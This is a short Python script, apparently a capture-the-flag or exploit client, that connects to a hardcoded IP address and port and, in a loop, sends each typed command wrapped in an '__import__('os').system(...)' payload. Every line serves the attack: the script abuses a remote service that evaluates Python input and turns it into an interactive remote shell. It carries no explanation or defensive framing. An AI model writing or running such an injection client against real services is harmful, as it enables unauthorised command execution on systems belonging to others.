import socket
from time import sleep

host = '213.170.100.211'
port = 10000

def connect(data):
        s = socket.socket()
        s.connect((host, port))
        s.recv(1024)
        s.send(('%s\n' % data).encode())
        sleep(0.5)
        req = s.recv(4096)
        print(req.decode())
        s.close()

cmd = ''
while cmd != '\q':
        cmd = input('> ')
        connect("__import__('os').system('%s')" % cmd)